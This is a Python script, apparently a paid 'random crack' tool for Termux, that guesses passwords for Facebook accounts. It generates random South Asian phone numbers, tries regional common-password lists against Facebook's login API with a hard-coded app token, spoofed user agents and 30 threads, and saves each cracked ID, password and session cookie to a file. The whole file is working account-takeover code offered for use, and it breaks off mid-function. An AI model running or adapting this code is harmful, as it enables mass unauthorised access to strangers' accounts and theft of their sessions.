#SC CREATE BY MEHADI VAI
#FULLFIRE SCRIPT
#-----------Import Module------------#
from os import path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,hashlib
os.system("clear");print("\n\n  \033[1;93m═══════।    ═════MEHADI-XD═══════।   ═════\n\n");time.sleep(3);os.system('xdg-open https://t.me/mehadi_cyber_999')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except:pass
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ XD ]__________________#
#-----------Colour------------#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#-----------country And Ip---------#
desh = requests.get("http://ip-api.com/json/").json()["country"]
ip = requests.get("https://api.ipify.org").text
#-----------User Agent------------#
samsung = random.choice(['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H'])
def hasan_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)
samsung1 = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def hasan_ua1():
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(samsung1)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return ua
	

####_______ua________####

def Samsung():
    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    ua=f"Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/LRX22C) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.15.89;FBPN/"+platform+";FBLC/sv_SE;FBBV/"+vir+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};FB_FW/1;]"
    return ua
 
def Bgrph_ua():
    facebook_version = f"{random.randint(10,450)}.{random.randint(0,0)}.{random.randint(0,9)}.{random.randint(1,40)}.{random.randint(10,450)}"
    fbbv = str(random.randint(00000000,99999999))
    mbvs = str(random.randint(000000,999999))
    fbrv = str(random.randint(000000000,999999999))
    density = random.choice(['2.0', '2.5' ,'2.75' ,'3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    android_version = random.choice(['9', '10' , '11', '12'])
    end = f"[FBAN/Orca-Android;FBAV/{str(facebook_version)};FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/{str(fbrv)};FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM//{{density={density},width={width},height={height}}};]"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {str(android_version)}; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) {end}"
    return ua

   
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; ═══════════════════════════MEHADI-XD════════════════\x07')
#-----------------------------------------------------#
#-----------Logo------------#
os.system('clear')
priti = """
\033[31;1m888b     d888          888                    888 d8b      
\033[30;1m8888b   d8888          888                    888 Y8P      
\033[33;1m88888b.d88888          888                    888          
\033[34;1m888Y88888P888  .d88b.  88888b.   8888b.   .d88888 888      
\033[30;1m888 Y888P 888 d8P  Y8b 888 "88b     "88b d88" 888 888      
\033[37;1m888  Y8P  888 88888888 888  888 .d888888 888  888 888      
\x1b[38;5;196m888   "   888 Y8b.     888  888 888  888 Y88b 888 888      
\033[38;5;46m888       888  "Y8888  888  888 "Y888888  "Y88888 888       
\x1b[38;5;46m\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mFACEBOOK  \x1b[38;5;254m● \x1b[38;5;46mMd Mehadi Sarkar 
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mTOOLTYPE \x1b[38;5;254m ● \x1b[38;5;46mRANDOM [&]\x1b[38;5;46m FILE CRACK
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mVERSION \x1b[38;5;254m  ● \x1b[38;5;46m[0.0.2] 
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mTOOLS  \x1b[38;5;254m   ● \x1b[38;5;46mPAID
\033[1;31m[\x1b[38;5;254m=\033[1;31m]  \x1b[38;5;46mCHANNEL\x1b[38;5;254m   ● \x1b[38;5;46mhttps://t.me/mehadi_cyber_999
\x1b[38;5;50m\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m"""
def lvl():
        print('\x1b[97m════════════════════════════════════════\x1b[97m')
#-----------Loop System------------#
loop=0
oks=[]
cps=[]
pcp=[]
ck=[]
#-----------Clear-----------#
def clear():
	os.system("clear")
#-----------Admin Info------------#
def admin_group():
	os.system('xdg-open https://t.me/mehadi_cyber_999');clear();jannat()
def admin_id():
	os.system('xdg-open https://t.me/mehadi_cyber_999');clear();jannat()
def admin_page():
	os.system('xdg-open https://www.facebook.com/abbu.mehadi.520?mibextid=ZbWKwL');clear();jannat()
#------Locked Id Remove------#			
def lock(uid):
        req = str(requests.get(f'https://gra'+'ph.facebook'+f'.com/{uid}/p'+'icture?typ'+'e=normal').text)
        if 'Photoshop' in req:
            return 'Active'
        else:
            return 'Locked'
#-----------Main Def------------#
def jannat():
	print(priti)
	lvl()
	print(" \033[38;5;192m~\033[38;5;44m>\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m RANDOM CRACK")
	print(" \033[38;5;192m~\033[38;5;44m>\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m TOOLS OWNER")
	print(" \033[38;5;192m~\033[38;5;44m>\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Exit")
	lvl()
	yasmin =input(" \033[38;5;192m~\033[38;5;44m>\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m CHOICE OPTION :")
	if yasmin in ["1","A","a"]:
		all_country()
	if yasmin in ["2","B","b"]:
		admin_id()
	if yasmin in ["0","C","c"]:
		os.system('exit')
	else:
		print(" \033[38;5;192m~\033[38;5;44m>\033[1;91m WORNING TYP TRY AGAIN ")
#-----------Oparetior Def------------#
def all_country():
	user=[]
	ck.append('all_country')
	clear()
	print(priti)
	lvl()
	print(' \033[38;5;192m~\033[38;5;196m>\x1b[92m INDIA: \33[1;33m+91639,+91629,+91659')
	print('\x1b[97m════════════════════════════════════════════════════\x1b[97m')
	print(' \033[38;5;192m~\033[38;5;196m>\x1b[92m BANGLADESH:\33[1;95m +88019,+88017,+88016,+88018')
	print('\x1b[97m══════════════════════════════════════════════════════════\x1b[97m')
	print(' \033[38;5;192m~\033[38;5;196m>\x1b[92m PAKISTAN: \33[1;33m+0306,+0307,+0317,+0318')
	print('\x1b[97m══════════════════════════════════════════════════════════\x1b[97m')
	print(' \033[38;5;192m~\033[38;5;196m>\x1b[92m NEPAL: \33[1;95m+9851,+9855,+9801,+9808')
	print('\x1b[97m════════════════════════════════════════════════════\x1b[97m')
	lvl()
	code = input(' \x1b[91m [\x1b[97m?\x1b[91m]\x1b[92m CHOICE YOUR COUNTRY CODE :\x1b[92m ')
	if '03' in code:
		ck.append('pk')
	elif '92' in code:
		ck.append('pk')
	elif '01' in code:
		ck.append('bd')
	elif '91' in code:
		ck.append('ind')
	elif '98' in code:
		ck.append('npl')
	else:
		print(' \033[38;5;192m~\033[38;5;44m>\033[1;91m WRONG INPUT');admin_group();time.sleep(3);clear();jannat()
	try:
		limit = int(input(' \x1b[91m [\x1b[97m?\x1b[91m]\x1b[92m INPUT LIMIT  : \x1b[92m'))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		if 'bd' in ck:
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
		else:
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as hasan:
		clear()
		tl = str(len(user))
		print(priti)
		lvl()
		#-----------Clone Start ------------#
		print(' \033[38;5;192m~\033[38;5;196m>\033[1;92m COUNTRY   : \033[1;93m'+desh)
		print(' \033[38;5;192m~\033[38;5;196m>\x1b[92m TOTAL IDz : \033[1;33m'+tl+'\n \033[38;5;192m~\033[38;5;196m>\x1b[92m SIM CODE  : \x1b[93m'+code)
		lvl()
		for psx in user:
			ids = code+psx
			if 'pk' in ck:
				passlist = [psx,ids,'khankhan','kingkhan','khan1122','janjan','pak123','khan12345','khan123','pubg123','baloch']
			elif 'bd' in ck:
				passlist = ['00998877','sumaiya','jannat','sadiya','nazmul','saiful','free fire','203040','304050','bangladesh','506070','708090','607080','@@@###','908070','jesmin','১২৩৪৫৬','১১২২৩৩','১২৩৪৫৬৭৮','77889900',ids,psx]
			elif 'ind' in ck:
				passlist = [ids,psx,'57575751','59039200','57273200','57575752','6842818','7305163']
			elif 'npl' in ck:
				passlist = [ids,psx,'nepal12','i love you','free fire','shahi123','pokhara','phkhara123','tamang@00','madar123','magar@123','lama123','lama@123','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			else:
				passlist = [ids,psx,'khan12','khan1234','khan123','baloch123','khan1122','khan12345','khan123456','khankhan']
			hasan.submit(asha,ids,passlist)
	print('\n')
	lvl()
	print(' \033[38;5;192m~\033[38;5;196m>\033[1;92m THE PROCESS HAS BEN COMPLETE ✓')
	print(' \033[38;5;192m~\033[38;5;196m>\033[1;92m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	lvl()
	back = input ('PRESS ENTER')
	clear();jannat()
#-----------Methoid------------#			
def asha(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;91m[\033[1;32mMehadi-XD\033[1;91m] \033[1;93m%s\033[1;37m ~ \033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			access_token = '6628568379|c1e620fa708a1d5696fb991c1bde5662'
			fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
			fbbv = str(random.randint(00000000,99999999))
			fbrv = str(random.randint(00000000,99999999))
			fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
			fbsv_ = fbsv.replace("_",".")
			model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
			abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
			build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
			ua = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;];Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;];/{density=3.0,width=1080,height=1920 Mozilla/5.0 (Linux; Android 5.1.1; vivo Y21L Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;] Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/null;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};] Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;] Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1'            
			data = {
			'adid':str(uuid.uuid4()),
			'format':'json',
			'api_key':'c1e620fa708a1d5696fb991c1bde5662',
			'community_id':'',
			'device_id':str(uuid.uuid4()),
			'family_device_id':str(uuid.uuid4()),
			'currently_logged_in_userid':'0',
			'try_num':'1',
			'email':ids,
			'password':pas,
			'generate_analytics_claim':'1',
			'cpl':'true',
			'generate_session_cookies':'1',
			'credentials_type':'password',
			'error_detail_type':'button_with_disabled',
			'source':'auth.login',
			'locale':'en_US',
			'client_country_code':'US',
			'advertising_id':str(uuid.uuid4()),
			'meta_inf_fbmeta':'NO_FILE',
			'access_token':access_token}
			head = {
			'Authorization':'OAuth '+access_token,
			'X-FB-Connection-Quality':'EXCELLENT',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
			'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
			'x-fb-friendly_name':'authenticate',
			'content-encoding':'application/x-www-form-urlencoded',
			'x-tigon-is_retry':'true',
			'x-fb-http-engine':'Liger',
			'x-requested-with':'FBIOS',
			'connection':'keep-alive',
			'user-agent': '[FBAN/FB4A;FBAV/15.0.0.4157;FBBV/8344680;[FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]',}
			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r \033[1;31m [\033[1;92mMehadi-💚\033[1;91m] \033[1;92m'+uid+' ~ '+pas)
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				open('/sdcard/Mehadi-💚.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
